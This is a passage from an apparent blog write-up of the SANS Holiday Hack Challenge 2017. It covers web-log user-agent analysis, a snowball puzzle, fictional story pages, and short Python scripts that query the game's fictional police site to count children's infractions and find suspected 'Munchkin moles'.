&lt;span class="go"&gt;      1 slack/2.47.1.7358 (Google Pixel XL; Android 8.0.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.0.7352 (samsung SM-N950U; Android 7.1.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.0.7352 (samsung SAMSUNG-SM-N910A; Android 6.0.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.0.7352 (samsung SAMSUNG-SM-G870A; Android 6.0.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.0.7352 (motorola Moto G (4); Android 7.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.0.7352 (Sony F8331; Android 7.1.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.0.7352 (OnePlus ONEPLUS A3003; Android 7.1.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.0.7352 (OnePlus A0001; Android 7.1.2)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.0.7352 (LGE Nexus 5; Android 6.0.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.0.7352 (Google Pixel; Android 8.0.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.46.0.7100 (lenovo Lenovo K8 Note; Android 7.1.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.46.0.7100 (Wingtech 2014818; Android 7.1.2)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.46.0.7100 (OnePlus ONE E1003; Android 6.0.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.46.0.7100 (OnePlus ONE A2003; Android 6.0.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 masscan/1.0 (https://github.com/robertdavidgraham/masscan)&lt;/span&gt;
&lt;span class="go"&gt;      1 masscan/1.0&lt;/span&gt;
&lt;span class="go"&gt;      1 curl/7.35.0&lt;/span&gt;
&lt;span class="go"&gt;      1 Slack/370354 CFNetwork/893.14 Darwin/17.3.0&lt;/span&gt;
&lt;span class="go"&gt;      1 Slack/370354 CFNetwork/893.10 Darwin/17.3.0&lt;/span&gt;
&lt;span class="go"&gt;      1 Slack/370342 CFNetwork/808.3 Darwin/16.3.0&lt;/span&gt;
&lt;span class="go"&gt;      1 Slack/370136 CFNetwork/811.5.4 Darwin/16.7.0&lt;/span&gt;
&lt;span class="go"&gt;      1 Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; Touch; MASEJS)&lt;/span&gt;
&lt;span class="go"&gt;      1 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; MASMJS)&lt;/span&gt;
&lt;span class="go"&gt;      1 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&lt;/span&gt;
&lt;span class="go"&gt;      1 Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36&lt;/span&gt;
&lt;span class="go"&gt;      1 Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0&lt;/span&gt;
&lt;span class="go"&gt;      1 Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&lt;/span&gt;
&lt;span class="go"&gt;      1 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&lt;/span&gt;
&lt;span class="go"&gt;      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko)&lt;/span&gt;
&lt;span class="go"&gt;      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;      1 Dillo/3.0.5&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Well, even though some other user-agents have only one hit, they seem to be
different versions of the same browser. &lt;code&gt;Dillo/3.0.5&lt;/code&gt; seems to be our
winner:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@7283fcc58ff6:~$&lt;/span&gt; ./runtoanswer
&lt;span class="go"&gt;Starting up, please wait......&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;Enter the name of the least popular browser in the web log: Dillo/3.0.5&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;That is the least common browser in the web log! Congratulations!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id9"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id42"&gt;Redirecting the snowball&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Now that we found the least popular browser, we get a new object: the Bumper,
which can redirect the snowball.&lt;/p&gt;
&lt;img alt="bumbles_bounce_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/bumbles_bounce_terminal.png" /&gt;
&lt;p&gt;Now here's the layout I used to redirect the snowball. Incidently, I learned
that the Jam slows the snowball down, because it's sticky:&lt;/p&gt;
&lt;img alt="bumbles_bounce_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/bumbles_bounce_snowball.gif" /&gt;
&lt;p&gt;This level had the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage5.pdf"&gt;fifth page to The Great Book&lt;/a&gt; (sha256: &lt;code&gt;aed664454f956ed4f80c54540c4980ae28912c3ff816733a6fb84b366bd32c67&lt;/code&gt;):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Abominable Snow Monster&lt;/p&gt;
&lt;p&gt;When the Elves and reindeer refugees first arrived at the North Pole, they
found a barren but workable landscape. The desolate peace of the cold North
was a welcomed change from the bitter battles with the Munchkins back in
Oz. Dressed up like Eskimos for their first several months, all elves from
one to ninety-two worked without interruption building homes for
themselves, stalls for the reindeer, toy production lines, and finally a
splendid castle for Santa.&lt;/p&gt;
&lt;p&gt;But then, it started. Some of their food stocks mysteriously disappeared.
Initially, the Elves hypothesized that Munchkins Moles were pilfering their
provisions, so they embarked on a detailed investigation. Sadly, the
taskforce found very little evidence, except for MASSIVE footprints in the
snow near the food storage bins.&lt;/p&gt;
&lt;p&gt;And then, it got worse. Elves started disappearing. One at a time, over the
space of a couple of weeks, a half dozen elves simply vanished, their last
known location surrounded by more gigantic footprints.&lt;/p&gt;
&lt;p&gt;The taskforce bravely followed the footprints back to an enormous cave,
where they found a gigantic furry beast with horrible fangs. The so-called
&amp;quot;Abominable Snow Monster&amp;quot; had enslaved the kidnapped elves, forcing them
to make gigantic snowballs he could throw as weapons. After mounting a
daring rescue operation, the Elves vowed to steer clear of the entire
region inhabited by the Abominable.&lt;/p&gt;
&lt;p&gt;In later years, through the tireless efforts of social worker and arctic
prospector Yukon Cornelius, a miracle occurred! The Abominable actually
became a jolly, happy soul, who could laugh and play. The Elves welcomed
the newly friendly beast and started calling him &amp;quot;Bumble&amp;quot; as he earned a
job putting Christmas tree toppers into place without a stepladder.&lt;/p&gt;
&lt;p&gt;Very recently, though, the Bumble's behaviour has become quite erratic.
Several times every day, his eyes seem to go blank as he stares off into
the distance. Rumor among the elves is that there must have been some
magic in something the Bumble ate. As of this writing, the Bumble is under
careful analysis by Yukon Cornelius and the North Pole's best
veterinarians. A diagnosis remains elusive.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;After solving this challenge, we have a little chat with Sam the Snowman:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Bumble:&lt;/strong&gt; Arrrrrrrrgh! Grrrrrrrr! ROOOOOOOAR!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sam the Snowman:&lt;/strong&gt; You've done it! You found out who was throwing the
giant snowballs! It was the Abominable Snow Monster. We should have known.
Thank you for your great work!&lt;/p&gt;
&lt;p&gt;But, you know, he doesn't seem quite himself. Look into his eyes. It almost
looks like he has been hypnotized. Something's not right with him.&lt;/p&gt;
&lt;p&gt;In fact, he seems to be under someone else's control. We've got to find out
who is pulling his strings, or else the real villain will remain on the
loose and will likely strike again.&lt;/p&gt;
&lt;p&gt;It means, buckle your seatbelt, dear player, because the North Pole is
going bye-bye.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="north-pole-christmas-town-infrastructure-north-pole-police-department-web-site"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id43"&gt;North Pole Christmas Town infrastructure: North Pole Police Department web site&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;In the fourth page, we learned the existence of Munchkin moles, that try to
pass for Elves in order to spy on them. Let's try to learn more about these
Munchkin moles!&lt;/p&gt;
&lt;p&gt;If we take a look back at the documents we found on the SMB server, there is
one called &amp;quot;BOLO - Munchkin Mole Report.docx&amp;quot;. This is the content:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;BOLO: Munchkin Mole Advisory&lt;/p&gt;
&lt;p&gt;Please be advised that the long-rumored munchkin moles are now believed to
be real.  After a detailed and thorough investigation, North Pole
Authorities have identified two munchkins impersonating elves in Santa's
workshop.&lt;/p&gt;
&lt;p&gt;When confronted, both munchkins were able to evade elf authorities after
throwing rocks and engaging in aggravated hair pulling. The pair
mysteriously disappeared after speaking an unknown word sounding like
&amp;quot;puuurzgexgull.&amp;quot;&lt;/p&gt;
&lt;p&gt;Munchkin Descriptions&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Name&lt;/strong&gt;: Boq Questrian&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Height&lt;/strong&gt;: Approximately 4 feet&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Weight&lt;/strong&gt;: Unknown&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Appearance&lt;/strong&gt;: Reddish skin tone, blue eyes. A single curl of hair
dominates an otherwise unremarkable hairstyle.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Warning&lt;/strong&gt;: Boq is uncannily accurate at short-distance rock throwing.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Name&lt;/strong&gt;: Bini Aru&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Height&lt;/strong&gt;: Approximately 4 feet&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Weight&lt;/strong&gt;: Unknown&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Appearance&lt;/strong&gt;: Pale skin, grey eyes. Unruly black hair.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Warning&lt;/strong&gt;: Bini is unrelenting in hair pulling.&lt;/p&gt;
&lt;p&gt;If you see these munchkin moles, do not attempt to detain or apprehend
them. Contact the North Pole Police Department for assistance.&lt;/p&gt;
&lt;p&gt;For more information visit &lt;a class="reference external" href="https://nppd.northpolechristmastown.com"&gt;https://nppd.northpolechristmastown.com&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Merry Christmas!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, two Munchkin moles were identified, Boq Questrian and Bini Aru. But there
may be more. Let's try and use the North Pole Police Department's website
to identify potential moles.&lt;/p&gt;
&lt;p&gt;The &lt;a class="reference external" href="https://nppd.northpolechristmastown.com"&gt;North Pole Police Department's website&lt;/a&gt;
has a section infractions, where you can find what kind of infractions were
commited by children. The infractions go from &lt;a class="reference external" href="https://nppd.northpolechristmastown.com/infractions?query=Playing+ball+in+house"&gt;playing ball in the house&lt;/a&gt;
to &lt;a class="reference external" href="https://nppd.northpolechristmastown.com/infractions?query=Trying+to+ruin+Christmas"&gt;trying to ruin Christmas&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;After too many infractions, children are put on the naughty list. But how many
infractions does it take?&lt;/p&gt;
&lt;p&gt;On the SMB server, we also had a file called &amp;quot;Naughty and Nice List.csv&amp;quot;, which
gives us, line by line, the name of a child and whether their naughty or nice:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; head Naughty&lt;span class="se"&gt;\ &lt;/span&gt;and&lt;span class="se"&gt;\ &lt;/span&gt;Nice&lt;span class="se"&gt;\ &lt;/span&gt;List.csv
&lt;span class="go"&gt;Abdullah Lindsey,Nice&lt;/span&gt;
&lt;span class="go"&gt;Abigail Chavez,Nice&lt;/span&gt;
&lt;span class="go"&gt;Aditya Perera,Naughty&lt;/span&gt;
&lt;span class="go"&gt;Adrian Kemp,Nice&lt;/span&gt;
&lt;span class="go"&gt;Adrian Lo,Nice&lt;/span&gt;
&lt;span class="go"&gt;Adriana Sutherland,Nice&lt;/span&gt;
&lt;span class="go"&gt;Agnes Adam,Nice&lt;/span&gt;
&lt;span class="go"&gt;Ahmed Hernandez,Nice&lt;/span&gt;
&lt;span class="go"&gt;Al Molina,Nice&lt;/span&gt;
&lt;span class="go"&gt;Alabaster Snowball,Nice&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Shame on you, Aditya Perera! Anyway, we can query the North Pole Police
Department website to query information on the children, and get results in
JSON for easy parsing. So, here's a quick Python script which queries the
NPPD website, and get the number of infractions for every child:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;naughty_nice_file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;https://nppd.northpolechristmastown.com/infractions?query={}&amp;amp;json=1&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;max_infraction_nice&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="n"&gt;min_infraction_naughty&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;maxsize&lt;/span&gt;

    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;naughty_nice_file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c1"&gt;# We read every line...&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
            &lt;span class="c1"&gt;# ...and get the name of the child&lt;/span&gt;
            &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
            &lt;span class="c1"&gt;# We retrieve the number of infraction for the child&lt;/span&gt;
            &lt;span class="n"&gt;number_of_infractions&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;count&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="c1"&gt;# If the child is nice, we see if the number of infraction is&lt;/span&gt;
            &lt;span class="c1"&gt;# greater than the existing max&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Nice&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;number_of_infractions&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;max_infraction_nice&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;max_infraction_nice&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;number_of_infractions&lt;/span&gt;
            &lt;span class="c1"&gt;# If the child is naughty, we see if the number of infraction is&lt;/span&gt;
            &lt;span class="c1"&gt;# smaller than the existing min&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Naughty&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;number_of_infractions&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;min_infraction_naughty&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;min_infraction_naughty&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;number_of_infractions&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Maximum number of infractions for nice child: {}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_infraction_nice&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Minimum number of infractions for naughty child: {}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;min_infraction_naughty&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usage: {} &amp;lt;naughty_nice_file&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, let's run the script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./number_of_infractions.py &lt;span class="s2"&gt;&amp;quot;Naughty and Nice List.csv&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Maximum number of infractions for nice child: 3&lt;/span&gt;
&lt;span class="go"&gt;Minimum number of infractions for naughty child: 4&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We've found that every nice child has at most three infractions, and every
naughty child has at least four infractions. So it's safe to say that it takes
four infractions to be put on the naughty list.&lt;/p&gt;
&lt;p&gt;Technically, we could have only queried the number of infractions for naughty
children, which wouls have given us four. Then we would only had to find a
nice child with three infractions, such as &lt;a class="reference external" href="https://nppd.northpolechristmastown.com/infractions?query=al+molina"&gt;Al Molina&lt;/a&gt;.
This supposes that &lt;span class="formula"&gt;&lt;i&gt;max&lt;/i&gt;_&lt;i&gt;infraction&lt;/i&gt;_&lt;i&gt;nice&lt;/i&gt; &amp;lt; &lt;i&gt;min&lt;/i&gt;_&lt;i&gt;infraction&lt;/i&gt;_&lt;i&gt;naughty&lt;/i&gt;&lt;/span&gt;,
but this seems to be a valid hypothesis.&lt;/p&gt;
&lt;p&gt;Now, according to the report, the Munchkin moles were heavily into hair-pulling
and rock-throwing. Let's query the NPPD website for children that commited both
these infractions:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;hair_pulling_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;https://nppd.northpolechristmastown.com/infractions?query=Aggravated+pulling+of+hair&amp;amp;json=1&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;rock_throwing_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;https://nppd.northpolechristmastown.com/infractions?query=Throwing+rocks+%28at+people%29&amp;amp;json=1&amp;#39;&lt;/span&gt;

    &lt;span class="c1"&gt;# We use sets to avoid duplicate names&lt;/span&gt;
    &lt;span class="n"&gt;hair_pullers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;rock_throwers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c1"&gt;# We first get hair-pullers&lt;/span&gt;
    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hair_pulling_url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;infractions&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
        &lt;span class="n"&gt;hair_pullers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

    &lt;span class="c1"&gt;# Then we get rock throwers&lt;/span&gt;
    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rock_throwing_url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;infractions&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
        &lt;span class="n"&gt;rock_throwers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

    &lt;span class="c1"&gt;# Finally, we get the intersection, to find children who have done both&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hair_pullers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;intersection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rock_throwers&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./find_moles.py
&lt;span class="go"&gt;Nina Fitzgerald&lt;/span&gt;
&lt;span class="go"&gt;Kirsty Evans&lt;/span&gt;
&lt;span class="go"&gt;Beverly Khalil&lt;/span&gt;
&lt;span class="go"&gt;Sheri Lewis&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
